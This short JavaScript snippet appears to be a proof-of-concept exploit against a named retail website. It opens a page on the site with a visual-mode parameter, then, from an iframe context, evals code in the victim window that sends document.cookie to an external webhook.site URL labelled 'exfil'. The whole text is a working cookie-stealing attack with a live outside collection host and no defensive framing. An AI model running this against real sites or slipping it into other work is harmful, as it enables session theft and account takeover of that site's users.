// This runs in the iframe context
var victimWindow = open('https://eur.halara.com/pages/shipping-customs?sa-visual-mode=true', 'victim-tab');

// Wait for navigation to complete
setTimeout(() => {
    // Now we have cross-window access on same origin
    victimWindow.eval(`
        fetch('https://webhook.site/8586d1a4-d038-4478-bc85-21f5c63d3740/exfil?cookies=' + encodeURIComponent(document.cookie));
    `);
}, 2000);